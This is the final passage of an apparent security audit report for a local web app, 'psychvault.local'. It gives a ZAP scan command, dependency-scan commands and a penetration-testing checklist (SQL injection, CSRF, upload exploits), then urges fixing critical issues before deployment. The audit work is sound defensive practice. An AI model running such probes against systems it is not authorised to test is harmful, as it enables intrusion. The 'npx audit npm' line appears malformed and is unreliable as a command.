docker run -t owasp/zap2docker-stable zap-baseline.py -t https://psychvault.local

# Dependency scanning
npx snyk test
npx audit npm

# Manual penetration testing checklist
# - Test CSRF on all forms
# - Attempt SQL injection in search
# - Try file upload exploits
# - Test rate limiting with tools like Apache Bench
# - Verify session fixation not possible
```

---

## Conclusion

This application has significant security gaps that must be addressed before production deployment. The **5 CRITICAL issues** require immediate remediation as they can lead to data breaches, unauthorized access, and service disruption. Once addressed, the application will be significantly more secure, though ongoing security maintenance is recommended.

**⚠️ DO NOT DEPLOY TO PRODUCTION WITHOUT FIXING CRITICAL ISSUES**
